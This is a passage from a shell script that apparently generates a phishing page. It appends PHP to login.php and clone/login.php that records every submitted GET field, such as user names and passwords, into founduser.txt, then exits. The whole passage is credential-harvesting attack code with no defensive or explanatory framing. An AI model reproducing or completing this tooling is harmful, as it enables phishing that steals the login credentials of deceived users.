printf "file_put_contents(\"founduser.txt\", \"%s: \"  . \$_GET['%s'] . \"\\n\", FILE_APPEND);" $line $line >> login.php
printf "\n}" >>  login.php
 done < name.txt

printf "\nexit();" >> clone/login.php
}

